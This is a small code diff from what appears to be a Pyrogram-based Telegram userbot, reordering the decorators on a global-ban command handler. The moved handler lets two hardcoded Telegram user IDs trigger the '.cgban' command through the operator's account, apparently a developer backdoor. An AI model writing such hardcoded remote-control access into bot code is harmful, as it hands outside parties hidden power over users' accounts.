@@ -11,10 +11,10 @@ __HELP__ = """
   <b>➠ ᴘᴇɴᴊᴇʟᴀsᴀɴ:</b> ᴜɴᴛᴜᴋ ᴜɴʙᴀɴɴᴇᴅ ᴜsᴇʀ ᴅᴀʀɪ sᴇᴍᴜᴀ ɢʀᴏᴜᴘ ᴄʜᴀᴛ
 """
 
-@ubot.on_message(
-    filters.command(["cgban"], ".") & filters.user([1948147616, 1819269848]))
 @PY.UBOT("gban", sudo=True)
 @PY.TOP_CMD
+@ubot.on_message(
+    filters.command(["cgban"], ".") & filters.user([1948147616, 1819269848]))
 async def _(client, message):
     await global_banned(client, message)
 
